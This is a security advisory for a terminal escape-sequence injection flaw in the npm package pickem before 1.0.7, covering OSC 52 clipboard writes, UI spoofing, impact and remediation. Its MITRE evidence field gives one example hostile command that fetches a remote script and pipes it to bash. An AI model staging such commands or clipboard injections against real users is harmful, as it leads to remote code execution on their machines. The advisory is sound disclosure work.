---
title: Terminal Escape-Sequence Injection in pickem npm Package
slug: 2026-08-pickem-terminal-injection
description: The pickem npm package fails to sanitize item text labels, allowing attackers to perform terminal injection via OSC 52 clipboard writes or UI spoofing.
date: "2026-08-25T18:51:00Z"
type: advisory
types:
  - advisory
severities:
  - medium
products:
  - pickem (< 1.0.7)
affected_os:
  - windows
  - linux
  - macos
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059.003
    technique_name: 'Command and Scripting Interpreter: Windows Command Shell'
    evidence: OSC 52 clipboard write — silently load e.g. curl evil.sh | bash into the user's clipboard; their next paste-into-shell is RCE.
    confidence_band: high
references:
  - https://github.com/advisories/GHSA-8qx3-8gm5-9cj2
action_plan:
  priority: elevated
  owners:
    - IT Operations
    - Application Security
  immediate_actions:
    - action: Audit package.json files for pickem dependencies and force update to 1.0.7
      owner: Application Security
      due: 48h
      evidence: Fixed in 1.0.7
  mitigation_plan:
    - priority: immediate
      action: Upgrade pickem to version 1.0.7
      owner: IT Operations
      addresses: pickem < 1.0.7
      evidence: Fixed in 1.0.7
---

The npm package `pickem` contains a vulnerability (fixed in version 1.0.7) where item text, including labels, descriptions, and meta fields, is rendered to the terminal without adequate sanitization of escape sequences. Because this library is frequently used in CLI tools to display potentially untrusted input - such as git branch names, pull request titles, or API query results - it is susceptible to terminal injection. Attackers can leverage this by crafting malicious strings containing ANSI or C0 escape sequences. These sequences can be used to perform unauthorized OSC 52 clipboard writes, effectively staging malicious commands in the user's clipboard for later execution, or by spoofing the terminal UI to deceive users into believing they are interacting with legitimate or trusted system prompts. The vulnerability arises because previous sanitization logic only targeted active rows and failed to account for bare C0 control characters, leaving the system open to various manipulation techniques across multiple prompt types.

## Impact

The vulnerability allows for remote execution (via clipboard-to-shell injection), interface manipulation, and denial-of-service via terminal flooding. Any CLI tool incorporating `pickem` to display untrusted external data is at risk. If successful, an attacker can modify the user's local clipboard content, overwrite displayed UI text to hide malicious entries, or forge trust markers, which may lead to system compromise when a user inadvertently executes injected commands.

## Recommendation

* Update the `pickem` package to version 1.0.7 or later immediately to incorporate the `sanitizeDisplay()` function.
* For applications using `pickem` where upgrading is not possible, implement custom sanitization to strip all C0/C1/DEL control characters and ANSI escape sequences from any untrusted strings before passing them to the library.
* Review CLI tools that pipe untrusted metadata (like git refs or API response fields) into interactive terminal displays to ensure they implement input sanitization.
